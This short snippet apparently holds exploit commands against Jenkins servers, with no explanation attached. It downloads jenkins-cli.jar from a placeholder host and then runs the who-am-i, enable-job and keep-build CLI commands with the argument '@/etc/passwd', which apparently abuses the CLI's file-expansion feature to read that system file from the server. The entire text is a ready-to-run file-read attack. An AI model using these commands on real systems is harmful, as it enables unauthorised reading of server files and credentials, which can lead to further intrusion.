wget http://domain/jnlpJars/jenkins-cli.jar -O jenkins-cli-ip.jar


java -jar jenkins-cli-ip.jar -noCertificateCheck -s  http://domain who-am-i "@/etc/passwd"
java -jar jenkins-cli-ip.jar -noCertificateCheck -s  http://domain enable-job "@/etc/passwd"
java -jar jenkins-cli-ip.jar -noCertificateCheck -s  http://domain keep-build "@/etc/passwd"
